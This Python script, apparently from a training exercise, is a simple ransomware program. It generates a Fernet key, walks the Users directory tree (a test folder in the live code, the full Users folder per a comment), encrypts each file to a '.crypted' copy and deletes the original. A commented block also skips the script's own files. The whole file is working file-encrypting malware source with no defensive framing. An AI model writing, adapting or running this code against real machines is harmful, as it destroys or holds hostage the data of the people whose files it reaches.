#!/usr/bin/python
#coding:utf-8
import os
from cryptography.fernet import Fernet

class exploreThenCrypt():
    '''
        Ici le commentaire de la fonction de la classe
    '''
    def __init__(self):
        self.key = Fernet.generate_key()
        self.keyname = os.environ["USERNAME"]

    #Key generator
    def keyCreation(self, keyname):
        #Write it down somewhere on a file
        with open(f"{keyname}.key", 'wb') as filekey:
            filekey.write(self.key)

    #Storing and reading the key
    def useTheKey(self, key, name):
        with open(name, 'rb') as file:
            crypting = file.read()

        #Using the key to crypt
        fernet = Fernet(key)
        encrypted = fernet.encrypt(crypting)
        encrypted_file = name + ".crypted"
        try:
            with open(encrypted_file, 'wb') as files:
                files.write(encrypted)
            os.remove(name)
        except:
            pass

    #Explore then crypt everything from root
    def exploreAll(self):
        #Define the target in a var which is a letter :/Users/....
        letter = os.environ["SystemDrive"]
        target = ["\\Users\\Wilder\\Desktop\\testscript\\"]
        #Crypting all folders and files from the target
        #use on the VM target = ["\\Users\\"]
        for x in target:
            for root, dirs, files in os.walk(x):
                for file in files:
                    dir = os.path.join(root, file)
                    self.useTheKey(self.key, dir)

'''
        #Code de Thomas
        rep = ["\\Users\\Wilder\\Desktop\\testscript\\"]
        for user in rep:
            for root, dirs, files in os.walk(user):
                for file in files:
                    my_files = ["crypt.py", "smtp.py" ]
                    if not(file in my_files):
                        for ext in file.split("."):
                            if(file.endswith(ext)):
                                my_ext = ["py"]
                                if not(ext in my_ext):
                                    try:
                                        full_path = os.path.join(root, file)
                                        print(full_path)
                                        #file_encrypt(key, full_path)
                                    except:
                                        pass
'''
# method split
# method endswith()
